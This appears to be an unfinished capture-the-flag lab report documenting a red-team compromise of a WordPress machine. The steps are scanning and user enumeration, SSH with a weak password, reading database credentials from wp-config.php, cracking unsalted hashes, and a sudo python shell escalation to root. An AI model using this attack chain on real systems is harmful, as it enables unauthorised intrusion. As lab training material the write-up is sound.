# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sS -sV -O 192.168.1.110
  # TODO: Insert scan output
```

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22 open ssh
  - Port 80 open http
  - Port 111 open rpcbind
  - Port 139 open netbios-ssn
  - Port 445 open netbios-ssn


The following vulnerabilities were identified on each target:
- Target 1
  - Enumeration
  - Weak Passwords
  - Unsalted Password Hashes
  - Escalation Privilege/ Python Sudo Access


### Exploitation

 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
 - Enumerate the WordPress site using WPSCAN
```
$ wpscan --url http://192.168.1.110/wordpress -eu 
  # TODO: Insert screenshot
``` 
 - There are two users. Michael and Steven
  #TODO: Insert screenshot

 - Use the command ```ssh michael@192.168.1.110`` and the password 'michael' to gain access
  #TODO: insert screenshot
 - By traversing the directories two flags are exposed:
   - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d}
     - **Exploit Used**
       - This flag was found in /var/www/html
       - #TODO insert screen shot of html directory
       - `cat service.html`
       - #TODO insert screenshot of flag1.txt
   - `flag2.txt`: {fc3fd58dcdad9ab23faca6e9a36e581c}
     - **Exploit Used**
       - This flag was found in /var/www/
       - `cat flag2.txt`
 - From the /var/www/html/ directory `cd wordpress` to find the `wp-config.php` file
 - This is where the MySQL username and password is located. 
 - Use the found username: root and password: R@v3nSecurity
 - Inside mysql, the following commands lead to password hashes and a flag3.txt
  ``` bash
     show databases;
     use wordpress;
     show tables;
     select * from wp_users;
     #TODO: insert screenshot
  ```
   - `flag3.txt`:{afc01ab56b50591e7dccf93122770cd2}
     - **Exploit Used**
       - Used the traversal of directories in mysql to obtain flag 3
       `select * from wp_posts`
       #TODO: include screenshot
 - After obtaining unsalted password hashes from 'wp_users', create the file 'wp_hashes.txt` containing the hashes to crack using john the ripper. 
 - john the ripper cracked the password for the user steven. The password is 'pink84'
 - Then, use the command `ssh steven@192.168.1.110' and the password 'pink84' to gain access to steven's user.
 - Check for permissions using `sudo -l`
 - steven can use sudo using python
 - Escalate privileges to gain root access and find flag 4
   - `flag4.txt`: {715dea6c055b9fe3337544932f2941ce}
     - **Exploit Used**
       - Unsalted User Password Hash and Privilege Escalation
       - `sudo python -c 'import pty;pty.spawn("/bin/sh")`
